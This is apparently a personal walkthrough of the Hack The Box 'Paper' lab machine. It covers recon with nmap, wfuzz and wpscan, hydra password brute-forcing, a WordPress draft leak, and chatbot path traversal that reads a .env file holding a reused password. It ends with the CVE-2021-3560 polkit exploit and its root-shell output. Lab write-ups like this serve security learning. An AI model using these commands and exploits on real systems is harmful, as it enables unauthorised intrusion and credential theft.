# scanning
* `TCP` Scan
TARGET=10.10.11.143 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)

## 80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9

## 443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain
| Subject Alternative Name: DNS:localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain/organizationalUnitName=ca-3899279223185377061

10.10.11.143    localhost.localdomain


> nmap -p- --min-rate=1000 -T4 10.10.11.143 -Pn -sU -vvv


## subdomain enum
> wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://office.paper/" -H "Host: FUZZ.office.paper" --hl 70

> wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://office.paper/" -H "Host: FUZZ.office.paper" --hl 70

chat

nothing

## dir search
> dirsearch http://localhost.localdomain/ -i 200 -f
[10:49:09] 200 -  171B  - /.npm/anonymous-cli-metrics.json
[10:50:47] 200 -   73KB - /icons/
[10:50:57] 200 -    9KB - /manual/index.html
[10:50:57] 200 -    9KB - /manual/

[13:41:11] Starting: 
[13:41:54] 200 -   73KB - /icons/
[13:41:55] 301 -    1B  - /index.php  ->  http://office.paper/
[13:41:56] 301 -    1B  - /index.php/  ->  http://office.paper/
[13:42:04] 301 -  235B  - /manual  ->  http://office.paper/manual/
[13:42:04] 200 -    9KB - /manual/
[13:42:20] 200 -    7KB - /readme.html
[13:42:43] 301 -  237B  - /wp-admin  ->  http://office.paper/wp-admin/
[13:42:43] 301 -  239B  - /wp-content  ->  http://office.paper/wp-content/
[13:42:43] 200 -    0B  - /wp-content/
[13:42:43] 301 -  240B  - /wp-includes  ->  http://office.paper/wp-includes/
[13:42:43] 302 -    1B  - /wp-admin/  ->  http://office.paper/wp-login.php?redirect_to=http%3A%2F%2Foffice.paper%2Fwp-admin%2F&reauth=1
[13:42:43] 200 -    1B  - /wp-blog-header.php
[13:42:44] 200 -  136B  - /wp-trackback.php
[13:42:44] 200 -    3KB - /wp-login.php
[13:42:44] 302 -    1B  - /wp-signup.php  ->  http://office.paper/wp-login.php?action=register
[13:42:44] 200 -    1B  - /wp-load.php
[13:42:44] 200 -  235B  - /wp-links-opml.php


> curl http://localhost.localdomain/.npm/anonymous-cli-metrics.json
{"metricId":"6793b6fd-c521-4385-9ea0-b743487d53c1","metrics":{"from":"2021-07-01T07:01:26.689Z","to":"2021-07-01T07:29:18.286Z","successfulInstalls":6,"failedInstalls":0}}

# office.paper
> nikto scan found domain office.paper

> wpscan --url http://office.paper -e p,u --plugins-detection aggressive
WordPress version 5.2.3 identified (Insecure, released on 2019-09-05)


# web enum
http://office.paper/index.php/author/prisonmike/


```
I am sorry everyone. I wanted to add every one of my friends to this blog, but Jan didn’t let me. So, other employees who were added to this blog are now removed. As of now there is only one user in this blog. Which is me! Just me.

nick
June 20, 2021 at 2:49 pm

Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
-Nick

```

* https://www.exploit-db.com/exploits/50108
* need to find an email

* try login using `prisonmike@office.htb`, confirm the email

P@$$w0rd!1234

* password brute
> wpscan --url http://office.paper -U prisonmike -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt
> hydra -l nick -P /usr/share/wordlists/rockyou.txt office.paper http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=incorrect"



> python3 /usr/share/exploitdb/exploits/linux/webapps/50108.py -t http://chat.office.paper -a prisonmike@office.paper -u prisonmike@office.paper


* http://office.paper/index.php/wp-json/wp/v2/users
nick, prisonmike


> hydra -l nick -P /usr/share/wordlists/rockyou.txt office.paper http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=incorrect"
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-21 15:56:38
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://office.paper:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=incorrect
[STATUS] 101.00 tries/min, 101 tries in 00:01h, 14344298 to do in 2367:03h, 16 active
[STATUS] 94.67 tries/min, 284 tries in 00:03h, 14344115 to do in 2525:23h, 16 active
[80][http-post-form] host: office.paper   login: nick   password: samuel


http://chat.office.paper/api/v1/method.callAnon/login
hydra -l nick -P /usr/share/wordlists/rockyou.txt office.paper http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=incorrect"

{"message":"{\"msg\":\"method\",\"method\":\"login\",\"params\":[{\"user\":{\"username\":\"nick\"},\"password\":{\"digest\":\"90cc33a41b541af2c1964e3e10a46088cbdedf63031efaa35d588a698c91193f\",\"algorithm\":\"sha-256\"}}],\"id\":\"4\"}"}

* https://www.exploit-db.com/exploits/47690
* http://office.paper/?static=1
```


test

Micheal please remove the secret from drafts for gods sake!

Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick

# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

Threat Level Midnight

A MOTION PICTURE SCREENPLAY,
WRITTEN AND DIRECTED BY
MICHAEL SCOTT

[INT:DAY]

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!
Recent Posts

    Feeling Alone!
    Secret of my success
    Hello Scranton!

Recent Comments

    nick on Feeling Alone!
    Creed Bratton on Hello Scranton!
```

* create a user account and login to chat

```
just call the bot by his name and say help. His name is recyclops.
For eg: sending "recyclops help" will spawn the bot and he'll tell you what you can and cannot ask him.
Now stop wasting my time PAM! I've got work to do!


Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.
Most frequently asked questions include:
- What time is it?
- What new files are in your sales directory?
- Why did the salesman crossed the road?
- What's the content of file x in your sales directory? etc.
Please note that I am a beta version and I still have some bugs to be fixed.
How to use me ? :
1. Small Talk:
You can ask me how dwight's weekend was, or did he watched the game last night etc.
eg: 'recyclops how was your weekend?' or 'recyclops did you watched the game last night?' or 'recyclops what kind of bear is the best?
2. Joke:
You can ask me Why the salesman crossed the road.
eg: 'recyclops why did the salesman crossed the road?'
<=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>
For security reasons, the access is limited to the Sales folder.
3. Files:
eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'
4. List:
You can ask me to list the files
5. Time:
You can ask me to what the time is
eg: 'recyclops what time is it?' or just 'recyclops time'

```

* recyclops list ..
* recyclops file ../sale/portfolio.txt

```
total 32
drwx------ 11 dwight dwight 281 Feb 21 10:22 .
drwxr-xr-x. 3 root root 20 Feb 21 14:38 ..
lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -> /dev/null
-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
-rwxr-xr-x 1 dwight dwight 1174 Sep 16 06:58 bot_restart.sh
drwx------ 5 dwight dwight 56 Jul 3 2021 .config
-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
drwx------ 2 dwight dwight 44 Feb 21 14:17 .gnupg
drwx------ 8 dwight dwight 4096 Feb 21 14:08 hubot
-rw-rw-r-- 1 dwight dwight 18 Sep 16 07:24 .hubot_history
drwx------ 3 dwight dwight 19 Jul 3 2021 .local
drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
drwx------ 2 dwight dwight 6 Sep 16 08:56 .ssh
-r-------- 1 dwight dwight 33 Feb 21 08:16 user.txt
drwxr-xr-x 2 dwight dwight 24 Sep 16 07:09 .vim


total 244
drwx------ 8 dwight dwight 4096 Feb 21 14:08 .
drwx------ 11 dwight dwight 281 Feb 21 10:22 ..
srwxr-xr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8000
srwxrwxr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8080
drwx--x--x 2 dwight dwight 36 Sep 16 07:34 bin
-rw-r--r-- 1 dwight dwight 258 Sep 16 07:57 .env
-rwxr-xr-x 1 dwight dwight 2 Jul 3 2021 external-scripts.json
drwx------ 8 dwight dwight 163 Jul 3 2021 .git
-rw-r--r-- 1 dwight dwight 917 Jul 3 2021 .gitignore
-rw-r--r-- 1 dwight dwight 89861 Feb 21 19:09 .hubot.log
-rwxr-xr-x 1 dwight dwight 1068 Jul 3 2021 LICENSE
drwxr-xr-x 89 dwight dwight 4096 Jul 3 2021 node_modules
drwx--x--x 115 dwight dwight 4096 Jul 3 2021 node_modules_bak
-rwxr-xr-x 1 dwight dwight 1062 Sep 16 07:34 package.json
-rwxr-xr-x 1 dwight dwight 972 Sep 16 07:26 package.json.bak
-rwxr-xr-x 1 dwight dwight 30382 Jul 3 2021 package-lock.json
-rwxr-xr-x 1 dwight dwight 14 Jul 3 2021 Procfile
-rwxr-xr-x 1 dwight dwight 5044 Jul 3 2021 README.md
drwx--x--x 2 dwight dwight 193 Jan 13 10:56 scripts
-rwxr-xr-x 1 dwight dwight 100 Jul 3 2021 start_bot.sh
drwx------ 2 dwight dwight 25 Jul 3 2021 .vscode
-rwxr-xr-x 1 dwight dwight 29951 Jul 3 2021 yarn.lock


 <!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file ../hubot/.env=====>

```
`dwight:Queenofblad3s!23`

> root@kali:~/workspace/htb-Paper# ssh dwight@10.10.11.143
The authenticity of host '10.10.11.143 (10.10.11.143)' can't be established.
ED25519 key fingerprint is SHA256:9utZz963ewD/13oc9IYzRXf6sUEX4xOe/iUaMPTFInQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.143' (ED25519) to the list of known hosts.
dwight@10.10.11.143's password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Mon Feb 21 09:16:49 2022 from 10.10.x.x
[dwight@paper ~]$ sudo -l
[sudo] password for dwight: 
Sorry, user dwight may not run sudo on paper.
[dwight@paper ~]$ ls
bot_restart.sh  hubot  sales  user.txt
[dwight@paper ~]$ cat users.
cat: users.: No such file or directory
[dwight@paper ~]$ cat user.txt 


# pe
[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/home/dwight/.local/bin:/home/dwight/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin
New path exported: /home/dwight/.local/bin:/home/dwight/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
@reboot /home/dwight/bot_restart.sh >> /home/dwight/hubot/.hubot.log 2>&1


[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:48320         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      2389/node           
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::443                  :::*                    LISTEN      - 

```bash
#!/bin/bash

# Cleaning hubot's log so that it won't grow too large.
echo "" > /home/dwight/hubot/.hubot.log


# For starting the bot 20-ish (10+20) seconds late, when the server is restarted.
# This is because MongoDB and Rocket-Chat server needs some time to startup properly
sleep 10s

# Checks if Hubot is running every 10s
while [ 1 ]; 
do
sleep 20s
alive=$(/usr/sbin/ss -tulnp|grep 8000);
if  [[ -n $alive ]]; then
	err=$(grep -i 'unhandled-rejections=strict' /home/dwight/hubot/.hubot.log)
	if [[ -n $err ]]; then
		# Restarts bot
		echo "[-] Bot not running! `date`";
		#Killing the old process
		pid=$(ps aux|grep -i 'hubot -a rocketchat'|grep -v grep|cut -d " " -f6); 
		kill -9 $pid;
		cd /home/dwight/hubot;
		# Cleaning hubot's log so that it won't grow too large.
		echo "" > /home/dwight/hubot/.hubot.log
		bash /home/dwight/hubot/start_bot.sh&
	else


		echo "[+] Bot running succesfully! `date`";
	fi

	else
		# Restarts bot
		echo "[-] Bot not running! `date`";
		#Killing the old process
		pid=$(ps aux|grep -i 'hubot -a rocketchat'|grep -v grep|cut -d " " -f6); 
		kill -9 $pid;
		cd /home/dwight/hubot;
		bash /home/dwight/hubot/start_bot.sh&
	fi

done
```

https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation

[dwight@paper ~]$ bash poc.sh -u=hacker -p=hacker123

[!] Username set as : hacker
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username hacker...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username hacker  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - hacker
[!] When prompted for password, enter your password 
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
[dwight@paper ~]$ su - hacker
Password: 
[hacker@paper ~]$ id
uid=1005(hacker) gid=1005(hacker) groups=1005(hacker),10(wheel)
[hacker@paper ~]$ sudo bash

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for hacker: 
[root@paper hacker]# id
uid=0(root) gid=0(root) groups=0(root)
